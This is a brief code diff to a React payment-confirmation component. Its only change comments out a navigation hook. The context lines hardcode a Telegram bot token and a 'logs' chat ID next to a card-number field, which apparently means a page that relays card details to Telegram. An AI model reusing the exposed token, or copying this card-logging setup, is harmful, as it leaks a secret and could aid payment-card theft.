@@ -7,7 +7,7 @@ const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
 const TELEGRAM_LOGS_CHAT_ID = '-1003861936742';
 
 function NextStepAppr() {
-  const navigate = useNavigate();
+  //const navigate = useNavigate();
   const [isConfirmed, setIsConfirmed] = useState(false);
   const [currentTime, setCurrentTime] = useState(new Date());
   const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
